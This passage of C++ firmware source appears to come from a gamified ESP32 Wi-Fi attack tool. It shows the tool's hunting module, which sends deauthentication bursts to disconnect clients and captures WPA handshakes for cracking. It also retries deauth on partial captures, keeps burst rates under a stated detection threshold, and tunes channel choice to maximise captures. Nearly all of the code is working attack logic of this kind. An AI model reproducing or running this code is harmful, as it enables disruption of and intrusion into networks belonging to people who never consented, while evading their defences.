            } else if (currentBehavior == HuntBehavior::SPRINT) {
                threshold = DEBOUNCE_SPRINT_TO_PATROL;
            } else {
                threshold = DEBOUNCE_CAMP_TO_PATROL;
            }
            if (transitionDebounce >= threshold) {
                switchBehavior(desired);
            }
        } else {
            pendingBehavior = desired;
            transitionDebounce = 1;
        }
    } else {
        transitionDebounce = 0;
    }
}

static int8_t getAdaptiveRSSIThreshold() {
    switch (currentBehavior) {
        case HuntBehavior::CAMP:    return RSSI_THRESH_CAMP;  // accept weaker signals (aggressive capture)
        case HuntBehavior::PATROL:  return RSSI_THRESH_PATROL;  // only strong signals
        case HuntBehavior::SPRINT:  return RSSI_THRESH_SPRINT;  // very strong only (drive-by)
        case HuntBehavior::LURK:    return RSSI_THRESH_LURK;  // focused but allow some margin
    }
    return RSSI_THRESH_CAMP;
}

static uint8_t getDeauthBurstCount(const DetectedClient& client) {
    // === FIX 4: Adaptive burst count based on client activity ===
    // Fresh clients (actively transmitting) need fewer frames
    // Sleepy clients (idle) need more aggressive burst
    // PIG ANGRY mode: higher counts across the board
    
    bool angry = Config::getDeauthAggressive();
    uint32_t age = millis() - client.lastSeen;
    uint8_t baseBurst;
    
    if (age < BURST_AGE_ACTIVE) {
        baseBurst = angry ? BURST_ACTIVE_ANGRY : BURST_ACTIVE_NORMAL;   // Very active
    } else if (age < BURST_AGE_RECENT) {
        baseBurst = angry ? BURST_RECENT_ANGRY : BURST_RECENT_NORMAL;   // Active
    } else if (age < BURST_AGE_SEMI) {
        baseBurst = angry ? BURST_SEMI_ANGRY : BURST_SEMI_NORMAL;   // Semi-active
    } else if (age < BURST_AGE_STALE) {
        baseBurst = angry ? BURST_STALE_ANGRY : BURST_STALE_NORMAL;   // Getting stale
    } else {
        baseBurst = angry ? BURST_SLEEPY_ANGRY : BURST_SLEEPY_NORMAL;  // Sleepy client
    }

    // Phase C: mood multiplier - more frames when hyped
    float multiplier = Mood::getEffectivenessMultiplier();
    baseBurst = (uint8_t)constrain((int)(baseBurst * multiplier), 1, (int)MAX_DEAUTH_BURST);
    
    // PATROL/SPRINT: reduce burst to save time (but not in angry mode)
    if (!angry && currentBehavior == HuntBehavior::PATROL && baseBurst > 3) {
        baseBurst -= 2;
    }
    // SPRINT: minimal deauth (shouldn't normally reach here, interval is huge)
    if (currentBehavior == HuntBehavior::SPRINT && baseBurst > 2) {
        baseBurst = 2;
    }
    // LURK: maximize burst (focused attack)
    if (currentBehavior == HuntBehavior::LURK) {
        baseBurst = (uint8_t)constrain((int)(baseBurst * LURK_BURST_MULTIPLIER), baseBurst, (int)MAX_DEAUTH_BURST);
    }
    
    return baseBurst;
}

// === CLEANUP FUNCTIONS ===

// Finalize a pending handshake - save to capture buffer
static void finalizeHandshake(PendingHandshake* pending) {
    if (!pending->active || pending->saved) {
        HAMLET_LOGF("[HS] finalize skipped: active=%d saved=%d\n",
                      pending->active, pending->saved);
        return;
    }
    HAMLET_LOGF("[HS] finalizing mask=0x%02X ssid=%s\n",
                  pending->capturedMask, pending->ssid);
    
    // Build CapturedHandshake and save (static — ~3.3KB, not reentrant but never called concurrently)
    static CapturedHandshake hs;
    memset(&hs, 0, sizeof(hs));
    
    memcpy(hs.bssid, pending->bssid, 6);
    memcpy(hs.station, pending->station, 6);
    strncpy(hs.ssid, pending->ssid, 32);
    hs.ssid[32] = '\0';
    memcpy(hs.frames, pending->frames, sizeof(hs.frames));
    hs.capturedMask = pending->capturedMask;
    hs.synced = false;

    uint32_t anchorMs = pending->lastSeenMs;
    uint32_t anchorEpoch = pending->lastSeenEpoch;
    if (anchorEpoch == 0) {
        anchorMs = millis();
        anchorEpoch = Config::getTrustedEpoch();
    }

    uint32_t frameFirstEpoch = 0;
    uint32_t frameLastEpoch = 0;
    for (int i = 0; i < 4; i++) {
        if (!hs.hasMessage(i + 1)) continue;
        if (hs.frames[i].timestamp == 0) {
            hs.frames[i].timestamp = resolveEpochFromAnchor(
                anchorEpoch, anchorMs, pending->frameSeenMs[i]);
        }
        if (hs.frames[i].timestamp == 0) continue;
        if (frameFirstEpoch == 0 || hs.frames[i].timestamp < frameFirstEpoch) {
            frameFirstEpoch = hs.frames[i].timestamp;
        }
        if (hs.frames[i].timestamp > frameLastEpoch) {
            frameLastEpoch = hs.frames[i].timestamp;
        }
    }

    hs.firstSeen = pending->firstSeenEpoch;
    if (hs.firstSeen == 0) {
        hs.firstSeen = resolveEpochFromAnchor(anchorEpoch, anchorMs, pending->firstSeenMs);
    }
    if (hs.firstSeen == 0) hs.firstSeen = frameFirstEpoch;

    hs.lastSeen = pending->lastSeenEpoch;
    if (hs.lastSeen == 0) {
        hs.lastSeen = resolveEpochFromAnchor(anchorEpoch, anchorMs, pending->lastSeenMs);
    }
    if (hs.lastSeen == 0) hs.lastSeen = frameLastEpoch;

    if (hs.firstSeen == 0 && hs.lastSeen != 0) hs.firstSeen = hs.lastSeen;
    if (hs.lastSeen == 0 && hs.firstSeen != 0) hs.lastSeen = hs.firstSeen;
    if (hs.firstSeen != 0 && hs.lastSeen != 0 && hs.lastSeen < hs.firstSeen) {
        uint32_t tmp = hs.firstSeen;
        hs.firstSeen = hs.lastSeen;
        hs.lastSeen = tmp;
    }
    
    // Attach beacon from network (for PCAP export via Pork Pig)
    hs.beaconData = nullptr;
    hs.beaconLen = 0;
    for (uint16_t i = 0; i < networkCount; i++) {
        if (memcmp(networks[i].bssid, pending->bssid, 6) == 0) {
            if (networks[i].beaconLen > 0) {
                hs.beaconData = networks[i].beaconFrame;
                hs.beaconLen = networks[i].beaconLen;
            }
            break;
        }
    }
    
    bool stored = Capture::addHandshake(&hs);
    HAMLET_LOGF("[HS] addHandshake returned %s (mask=0x%02X)\n",
                  stored ? "TRUE" : "FALSE", hs.capturedMask);
    if (stored) {
        sessionHandshakes++;
        Config::incrementTotalHandshakes();
        Config::incrementSessionHSCount();
        pendingHandshakeBeep = true;  // Deferred beep (callback-safe)

        // ==[ VICTORY CELEBRATION ]== pig reacts to completed 4-way
        Mood::onFourwayVictory();
        Avatar::dropFruit();
        Avatar::attackHop();
        Avatar::triggerTailWiggle();

        // Mark network as captured + capture type collection
        for (uint16_t i = 0; i < networkCount; i++) {
            if (memcmp(networks[i].bssid, pending->bssid, 6) == 0) {
                networks[i].hasHandshake = true;
                uint8_t authType = (uint8_t)networks[i].authmode;
                if (Config::markAuthTypeSeen(authType)) {
                    Mood::onFirstDiscovery(authType);
                }
                break;
            }
        }
        
        // Update channel stats - use CAPTURE channel, not current
        channelStats[pending->captureChannel].handshakeHits++;
        
        // D-UCB: Record reward to CAPTURE channel (unified arms)
        // This fixes misattribution when channel hops during grace period
        {
            uint8_t ch = pending->captureChannel;
            if (ch >= 1 && ch <= 13) {
                bool wasFirstReward = ((channelFirstReward & (1 << ch)) == 0);
                channelArms[ch].dRewards += CQS_CAPTURE_BONUS;  // actual capture >> CQS signal
                // Persist lifetime
                uint16_t lifetime = Config::getChannelRewards(ch);
                if (lifetime < 0xFFFF) lifetime++;
                Config::setChannelRewards(ch, lifetime);
                Config::saveChannelRewards();
                if (wasFirstReward) {
                    channelFirstReward |= (1 << ch);
                    Mood::onChannelLearned(ch);
                }
            }
        }
        
        // graduated XP celebration (40/30/20/10 by session count)
        Mood::onHandshakeCapture(pending->ssid);

        // combo pitch escalation: captures within 60s window
        {
            uint32_t now = millis();
            if (now - lastCaptureTime < COMBO_WINDOW && lastCaptureTime > 0) {
                captureComboCount++;
            } else {
                captureComboCount = 1;
            }
            lastCaptureTime = now;
            float combo = powf(COMBO_PITCH_BASE, captureComboCount - 1);
            if (combo > COMBO_PITCH_MAX) combo = COMBO_PITCH_MAX;
            SFX::setComboPitch(combo);
        }

        // LURK exit: handshake captured, mission complete
        if (currentBehavior == HuntBehavior::LURK) {
            exitLurk();
            switchBehavior(HuntBehavior::CAMP);
        }

        // === CHEF'S KISS AUDIO EASTER EGGS ===
        if (sessionHandshakes == 1 && sessionPMKIDs == 0) {
            Mood::onFirstCapture();
            SFX::play(SFX::FIRST_CATCH);  // Fanfare + Morse W
        }
        // Every 10th capture = milestone Morse GG
        uint32_t totalLifetime = Config::getTotalPMKIDs() + Config::getTotalHandshakes();
        if (totalLifetime > 0 && totalLifetime % 10 == 0) {
            SFX::play(SFX::MILESTONE);  // Morse GG easter egg
        }

        // lifetime capture milestones
        if (totalLifetime == 10 || totalLifetime == 25 || totalLifetime == 50 ||
            totalLifetime == 100 || totalLifetime == 250 || totalLifetime == 500 ||
            totalLifetime == 1000) {
            Mood::onMilestone(networkCount, (int)totalLifetime);
        }
    }
    
    // Mark as saved but keep active to collect more frames (they'll be ignored by addHandshake)
    pending->saved = true;
    pending->active = false;  // Now safe to deactivate
}

static void cleanupStalePending() {
    uint32_t now = millis();

    portENTER_CRITICAL(&hsMux);

    for (uint8_t i = 0; i < MAX_PENDING_HANDSHAKES; i++) {
        if (pendingHandshakes[i].active) {
            PendingHandshake pending;
            memcpy(&pending, &pendingHandshakes[i], sizeof(PendingHandshake));

            portEXIT_CRITICAL(&hsMux);

            // Check if grace period expired - time to save!
            if (pending.completeTimeMs > 0 && !pending.saved) {
                uint32_t elapsed = now - pending.completeTimeMs;
                if (elapsed > HANDSHAKE_GRACE_PERIOD) {
                    HAMLET_LOGF("[HS] grace expired: elapsed=%ums mask=0x%02X\n",
                                  elapsed, pending.capturedMask);
                    finalizeHandshake(&pendingHandshakes[i]);
                    portENTER_CRITICAL(&hsMux);
                    continue;
                }
            }

            // === PARTIAL HANDSHAKE RETRY: queue deauth for captures missing M2 ===
            // M2 contains SNonce which is critical for cracking
            bool needsM2 = !(pending.capturedMask & 0x02);
            bool hasOtherFrames = (pending.capturedMask & ~0x02) != 0;
            if (needsM2 && hasOtherFrames && !pending.retryExhausted &&
                pending.completeTimeMs == 0 &&
                now - pending.lastSeenMs > PARTIAL_RETRY_DELAY) {
                queueRetryDeauth(pending.bssid, pending.station);
                // DON'T reset lastSeenMs — let STALE_PENDING_TIMEOUT naturally expire the entry.
                // old code reset it here, which kept partial entries alive forever in an
                // infinite retry loop (retry exhausted → re-queued → retry exhausted → ...).
            }

            // Check if handshake is stale (no frames for too long)
            if (now - pending.lastSeenMs > STALE_PENDING_TIMEOUT) {
                // If it was valid but not saved, save it before clearing
                if (pending.completeTimeMs > 0 && !pending.saved) {
                    finalizeHandshake(&pendingHandshakes[i]);
                }
                // ==[ NEAR-MISS ]== partial handshake expired without completion
                if (pending.capturedMask > 0 && pending.capturedMask < 0x0F && !pending.saved) {
                    // find SSID for this BSSID
                    const char* nmSSID = nullptr;
                    for (uint16_t n = 0; n < networkCount; n++) {
                        if (memcmp(networks[n].bssid, pending.bssid, 6) == 0) {
                            nmSSID = networks[n].ssid;
                            break;
                        }
                    }
                    Mood::onNearMiss(pending.capturedMask, nmSSID);
                }

                portENTER_CRITICAL(&hsMux);
                pendingHandshakes[i].active = false;
                memset(&pendingHandshakes[i], 0, sizeof(PendingHandshake));
                // stay locked — loop invariant: locked at top of each iteration
            } else {
                portENTER_CRITICAL(&hsMux);
            }
        }
    }

    portEXIT_CRITICAL(&hsMux);
}

// === PARTIAL HANDSHAKE RETRY FUNCTIONS ===

static void queueRetryDeauth(const uint8_t* bssid, const uint8_t* station) {
    // Check if already queued
    for (uint8_t i = 0; i < MAX_RETRY_QUEUE; i++) {
        if (retryQueue[i].active &&
            memcmp(retryQueue[i].bssid, bssid, 6) == 0 &&
            memcmp(retryQueue[i].station, station, 6) == 0) {
            return;  // Already queued
        }
    }
    
    // Find free slot
    for (uint8_t i = 0; i < MAX_RETRY_QUEUE; i++) {
        if (!retryQueue[i].active) {
            memcpy(retryQueue[i].bssid, bssid, 6);
            memcpy(retryQueue[i].station, station, 6);
            retryQueue[i].queuedTime = millis();
            retryQueue[i].attempts = 0;
            retryQueue[i].active = true;
            retryCount++;
            return;
        }
    }
    
    // Queue full - evict oldest active entry
    uint32_t oldest = UINT32_MAX;
    uint8_t oldestIdx = 0;
    for (uint8_t i = 0; i < MAX_RETRY_QUEUE; i++) {
        // Defensive: only consider active entries (should all be active here)
        if (retryQueue[i].active && retryQueue[i].queuedTime < oldest) {
            oldest = retryQueue[i].queuedTime;
            oldestIdx = i;
        }
    }
    memcpy(retryQueue[oldestIdx].bssid, bssid, 6);
    memcpy(retryQueue[oldestIdx].station, station, 6);
    retryQueue[oldestIdx].queuedTime = millis();
    retryQueue[oldestIdx].attempts = 0;
    retryQueue[oldestIdx].active = true;
}

static bool processRetryQueue() {
    if (!Config::getDeauthEnabled()) return false;
    
    uint32_t now = millis();
    
    for (uint8_t i = 0; i < MAX_RETRY_QUEUE; i++) {
        if (retryQueue[i].active) {
            RetryTarget* target = &retryQueue[i];
            
            // Check if enough time has passed since queueing
            if (now - target->queuedTime < PARTIAL_RETRY_DELAY) {
                // Let the partial capture cool before putting the same station
                // back under the lamp; immediate retries only repeat the miss.
                continue;
            }
            
            // Find the network for this BSSID
            DetectedNetwork* net = nullptr;
            for (uint16_t n = 0; n < networkCount; n++) {
                if (memcmp(networks[n].bssid, target->bssid, 6) == 0) {
                    net = &networks[n];
                    break;
                }
            }
            
            if (net == nullptr || net->hasHandshake) {
                // Network gone or already captured - remove from queue
                target->active = false;
                if (retryCount > 0) retryCount--;
                continue;
            }
            
            // Check if network signal too weak (moved far away)
            if (net->rssi < getAdaptiveRSSIThreshold() - 10) {
                target->active = false;
                if (retryCount > 0) retryCount--;
                continue;
            }
            
            // Check if network stale (not seen in 30s)
            if (now - net->lastSeen > NETWORK_RETRY_STALE_MS) {
                target->active = false;
                if (retryCount > 0) retryCount--;
                continue;
            }
            
            // Check if pending handshake now has M2
            bool hasM2 = false;
            for (uint8_t p = 0; p < MAX_PENDING_HANDSHAKES; p++) {
                if (pendingHandshakes[p].active &&
                    memcmp(pendingHandshakes[p].bssid, target->bssid, 6) == 0 &&
                    memcmp(pendingHandshakes[p].station, target->station, 6) == 0) {
                    if (pendingHandshakes[p].capturedMask & 0x02) {
                        hasM2 = true;
                    }
                    break;
                }
            }
            
            if (hasM2) {
                // Got M2 - no retry needed
                target->active = false;
                if (retryCount > 0) retryCount--;
                continue;
            }
            
            // Perform retry deauth!
            target->attempts++;

            if (target->attempts > MAX_RETRY_ATTEMPTS) {
                target->active = false;
                if (retryCount > 0) retryCount--;
                // mark pending entry so cleanup won't re-queue a fresh retry
                for (uint8_t p = 0; p < MAX_PENDING_HANDSHAKES; p++) {
                    if (pendingHandshakes[p].active &&
                        memcmp(pendingHandshakes[p].bssid, target->bssid, 6) == 0 &&
                        memcmp(pendingHandshakes[p].station, target->station, 6) == 0) {
                        pendingHandshakes[p].retryExhausted = true;
                        break;
                    }
                }
                continue;
            }

            // Switch to target channel
            esp_err_t err = esp_wifi_set_channel(net->channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                HAMLET_LOGF("[HUNT] channel set ch%d failed: 0x%x\n", net->channel, err);
            } else {
                currentChannel = net->channel;
            }

            // Motion-aware retry burst (avoid detection threshold: 3 frames/2s)
            uint8_t retryFrames = (currentBehavior == HuntBehavior::CAMP || currentBehavior == HuntBehavior::LURK) ? 2 : 1;
            WSLBypasser::sendDeauthBurst(target->bssid, target->station, retryFrames, DEAUTH_NORMAL_INTERVAL);

            // dwell on this channel so we can catch M2 response (~50-200ms)
            postDeauthDwellStart = millis();
            lastHopTime = millis();

            // keep pending entry alive — we're actively working this handshake.
            // (cleanup no longer resets lastSeenMs, so without this the entry
            //  would expire at STALE_PENDING_TIMEOUT before retry #2 can fire.)
            for (uint8_t p = 0; p < MAX_PENDING_HANDSHAKES; p++) {
                if (pendingHandshakes[p].active &&
                    memcmp(pendingHandshakes[p].bssid, target->bssid, 6) == 0 &&
                    memcmp(pendingHandshakes[p].station, target->station, 6) == 0) {
                    pendingHandshakes[p].lastSeenMs = now;
                    break;
                }
            }

            Mood::setPhrase("RETRY M2!", AvatarState::HUNTING);

            // Update timing to prevent immediate re-trigger
            target->queuedTime = now;

            return true;  // Only process one retry per update cycle
        }
    }
    
    return false;
}

static void clearRetryForClient(const uint8_t* bssid, const uint8_t* station) {
    for (uint8_t i = 0; i < MAX_RETRY_QUEUE; i++) {
        if (retryQueue[i].active &&
            memcmp(retryQueue[i].bssid, bssid, 6) == 0 &&
            memcmp(retryQueue[i].station, station, 6) == 0) {
            retryQueue[i].active = false;
            if (retryCount > 0) retryCount--;
            return;
        }
    }
}

// === D-UCB CHANNEL SELECTION FUNCTIONS ===

static uint8_t selectChannelDUCB() {
    // If we're mid-attack (TARGETING/THROWING), extend dwell - don't hop away!
    if (deauthState == DeauthState::TARGETING || deauthState == DeauthState::THROWING) {
        return currentChannel;
    }

    // Check if coordination is enabled and we're in slave role
    if (coordinationEnabled && coordinationRole == 1) { // Slave role
        uint32_t now = millis();

        // If we have an assigned channel and it's still valid, use it
        if (assignedChannel > 0 && assignedChannel <= 13 &&
            TimeMath::before(now, assignedUntil)) {
            return assignedChannel;
        }

        // Clear the assignment if it's expired
        if (assignedChannel != 0 && TimeMath::reached(now, assignedUntil)) {
            assignedChannel = 0;
        }
    }

    // Phase 1: Force-visit channels with near-zero discounted pulls
    // D-UCB naturally re-explores forgotten channels — dPulls decays to 0 over time
    for (uint8_t ch = 1; ch <= 13; ch++) {
        if (!channelAllowedByFlock(ch)) continue;
        if (channelArms[ch].dPulls < DUCB_MIN_DPULLS) {
            return ch;
        }
    }

    // Phase 2: D-UCB selection with adaptive alpha
    // score = exploitation + alpha * exploration + coord
    // exploration term handles explore-exploit tradeoff (diminishing penalty removed)
    float bestScore = -1.0f;
    uint8_t bestChannel = 1;
    float logTotal = logf(fmaxf(1.0f, totalDPulls));
    uint32_t now = millis();

    // Adaptive alpha: decays per location epoch, floors at DUCB_ALPHA_MIN
    float alpha = fmaxf(DUCB_ALPHA_INIT / (1.0f + DUCB_ALPHA_DECAY * (float)ducbTLocal),
                        DUCB_ALPHA_MIN);

    for (uint8_t ch = 1; ch <= 13; ch++) {
        if (!channelAllowedByFlock(ch)) continue;
        if (channelArms[ch].dPulls < DUCB_MIN_DPULLS) {
            return ch;  // safety — shouldn't happen after phase 1
        }

        // Exploitation: CQS-fed avg reward + partial bonus
        float avg = channelArms[ch].dRewards / channelArms[ch].dPulls;
        float exploitation = avg + channelArms[ch].partialBonus;

        // Exploration: classic UCB1 confidence interval
        float exploration = sqrtf(2.0f * logTotal / channelArms[ch].dPulls);

        // Coordination priority adjustment
        float coordAdjustment = 0.0f;
        if (coordinationEnabled && coordinationRole != 0) {
            uint8_t adjValue = priorityAdjustments[ch-1];
            if (adjValue > 100) adjValue = 100;
            coordAdjustment = ((float)adjValue - 50.0f) / 50.0f;
        }

        float score = exploitation + alpha * exploration + coordAdjustment;

        if (score > bestScore) {
            bestScore = score;
            bestChannel = ch;
        }
    }

    // Track exploitation mode - same channel 3x in a row = pig is exploiting knowledge
    if (bestChannel == ducbLastBestChannel) {
        ducbSameChannelCount++;
        float bestAvg = (channelArms[bestChannel].dPulls > DUCB_MIN_DPULLS)
                        ? channelArms[bestChannel].dRewards / channelArms[bestChannel].dPulls : 0.0f;
        if (ducbSameChannelCount == 3 && bestAvg > 0.01f) {
            Mood::onChannelExploit(bestChannel);
            ducbSameChannelCount = 0;
        }
    } else {
        ducbLastBestChannel = bestChannel;
        ducbSameChannelCount = 1;
    }

    return bestChannel;
}

static void tickChannelExposure(uint32_t now) {
    // Behavior-specific gamma and tick cadence (unified arms, 4-state FSM)
    float gamma = getGamma();
    uint32_t tickMs = getTickMs();

    if (lastExposureTick == 0) {
        lastExposureTick = now;
        return;
    }

    // Bound catch-up work: don't loop forever after long stalls
    const uint8_t maxTicks = MAX_EXPOSURE_TICKS;
    uint8_t ticks = 0;
    while ((now - lastExposureTick) >= tickMs && ticks < maxTicks) {
        ticks++;
        lastExposureTick += tickMs;

        if (currentChannel < 1 || currentChannel > 13) continue;

        // D-UCB: discount ALL arms — past observations decay exponentially
        // Garivier & Moulines 2011: stale data fades, uncertainty on unvisited arms grows
        for (uint8_t ch = 1; ch <= 13; ch++) {
            channelArms[ch].dPulls *= gamma;
            channelArms[ch].dRewards *= gamma;
            channelArms[ch].partialBonus *= DUCB_PARTIAL_DECAY;  // independent decay (~144s half-life)
        }

        // Increment current channel (the arm we're pulling this tick)
        channelArms[currentChannel].dPulls += 1.0f;

        // CQS: continuous density-aware micro-reward based on observable network quality
        // bandit learns from presence, not just captures. key change for wider target list.
        float cqs = computeChannelQuality(currentChannel, now);
        channelArms[currentChannel].dRewards += cqs;

        // Recompute total discounted pulls
        float total = 0.0f;
        for (uint8_t ch = 1; ch <= 13; ch++) total += channelArms[ch].dPulls;
        totalDPulls = total;

        ducbTLocal++;  // adaptive alpha decay counter
    }

    // ==[ BSSID NOVELTY ]== location-change detection for alpha reset (OPT-6: behavior-adaptive)
    // Behavior-adaptive window: faster movement = shorter evaluation window
    uint32_t noveltyWindow;
    switch (currentBehavior) {
        case HuntBehavior::SPRINT:  noveltyWindow = NOVELTY_WINDOW_SPRINT; break;
        case HuntBehavior::PATROL:  noveltyWindow = NOVELTY_WINDOW_PATROL; break;
        default:                    noveltyWindow = NOVELTY_WINDOW_CAMP;   break;
    }

    if (lastNoveltyCheck == 0) {
        lastNoveltyCheck = now;
    } else if ((now - lastNoveltyCheck) > noveltyWindow) {
        if (noveltyTotal > NOVELTY_MIN_BEACONS &&
            noveltyNovel * 100 > noveltyTotal * NOVELTY_THRESHOLD) {
            ducbTLocal = 0;  // RESET alpha — new area, re-explore
        }
        noveltyNovel = 0;
        noveltyTotal = 0;
        lastNoveltyCheck = now;
    }

    // ==[ BURST DETECTION ]== OPT-6: 4+ new BSSIDs in 5s = immediate alpha reset
    if (burstWindowStart == 0 || (now - burstWindowStart) > BURST_WINDOW_MS) {
        burstNewCount = 0;
        burstWindowStart = now;
    }
    if (burstNewCount >= BURST_THRESHOLD) {
        ducbTLocal = 0;  // immediate re-explore
        burstNewCount = 0;
        burstWindowStart = now;
    }

    // If we fell behind too far, resync
    if ((now - lastExposureTick) > EXPOSURE_RESYNC_MS) {
        lastExposureTick = now;
    }
}

static void recordChannelReward(uint8_t channel) {
    if (channel >= 1 && channel <= 13) {
        bool wasFirstReward = ((channelFirstReward & (1 << channel)) == 0);
        channelArms[channel].dRewards += CQS_CAPTURE_BONUS;  // actual capture >> CQS signal

        // Persist to NVS as lifetime rewards (increment, don't overwrite)
        uint16_t lifetime = Config::getChannelRewards(channel);
        if (lifetime < 0xFFFF) lifetime++;
        Config::setChannelRewards(channel, lifetime);
        Config::saveChannelRewards();
        
        // Pig commentary on learning
        if (wasFirstReward) {
            channelFirstReward |= (1 << channel);  // Mark discovered
            Mood::onChannelLearned(channel);
        }
    }
}

// ==[ PARTIAL REWARD ]== D-UCB learning signal for incomplete handshakes
// Records a bonus for channels where M1+M2 was captured (shows promise)
// Doesn't persist to NVS - session-only learning signal
static void recordPartialReward(uint8_t channel, float bonus) {
    if (channel >= 1 && channel <= 13 && bonus > 0.0f) {
        // Cap partial bonus — M1+M2 detection meaningful vs capture bonus (25.0)
        channelArms[channel].partialBonus = fminf(channelArms[channel].partialBonus + bonus, PARTIAL_BONUS_CAP);
    }
}

static void checkDeadAir() {
    uint32_t now = millis();
    
    // Check if we haven't seen any beacons recently
    if (lastNetworkSeen > 0 && (now - lastNetworkSeen > DEAD_AIR_THRESHOLD)) {
        if (!inDeadAir) {
            inDeadAir = true;
            deadAirStart = now;
            Mood::onDeadAir();
        }
    }
    
    // Check if we've recovered from dead air
    if (inDeadAir && networkCount > 0 && lastNetworkSeen > deadAirStart) {
        inDeadAir = false;
        Mood::onBackOnline();
    }
}

// === COORDINATION API ===

void enableCoordination(bool enabled) {
    coordinationEnabled = enabled;
}

bool isCoordinationEnabled() {
    return coordinationEnabled;
}

void setCoordinationRole(uint8_t role) {
    coordinationRole = role;
}

uint8_t getCoordinationRole() {
    return coordinationRole;
}

void setAssignedChannel(uint8_t channel, uint32_t validUntil) {
    if (channel >= 1 && channel <= 13) {
        assignedChannel = channel;
        assignedUntil = validUntil;
    }
}

void updatePriorityAdjustments(const uint8_t* adjustments) {
    if (adjustments) {
        for (int i = 0; i < 13; i++) {
            priorityAdjustments[i] = adjustments[i];
        }
    }
}

// ==[ DUAL-BAND: 5GHz via C5Monster ]==

static bool dualBandActive = false;
static uint16_t c5MonsterNetworkCount = 0;
static int8_t c5MonsterBestRssi = -127;
static uint8_t c5MonsterBestChannel = 0;
static uint32_t c5MonsterLastScanMs = 0;

void feedC5MonsterScan(const C5Monster::ScanResults& results) {
    uint16_t count = 0;
    int8_t bestRssi = -127;
    uint8_t bestChannel = 0;
    uint32_t scanTimeMs = results.timestampMs ? results.timestampMs : millis();

    for (uint8_t i = 0; i < results.count; i++) {
        const auto& entry = results.entries[i];
        if (!entry.is5GHz) continue;
        if (entry.channel < 36 || entry.channel > 165) continue;
        count++;
        if (entry.rssi > bestRssi) {
            bestRssi = entry.rssi;
            bestChannel = entry.channel;
        }
    }

    c5MonsterNetworkCount = count;
    c5MonsterBestRssi = bestRssi;
    c5MonsterBestChannel = bestChannel;
    c5MonsterLastScanMs = scanTimeMs;
    dualBandActive = C5Monster::isConnected();
}

bool isDualBandActive() {
    return dualBandActive && C5Monster::isConnected();
}

uint16_t getC5MonsterNetworkCount() {
    return c5MonsterNetworkCount;
}

int8_t getC5MonsterBestRssi() {
    return c5MonsterBestRssi;
}

uint8_t getC5MonsterBestChannel() {
    return c5MonsterBestChannel;
}

uint32_t getC5MonsterScanAgeMs() {
    uint32_t last = c5MonsterLastScanMs;
    if (last == 0) return UINT32_MAX;
    return millis() - last;
}

} // namespace Hunt
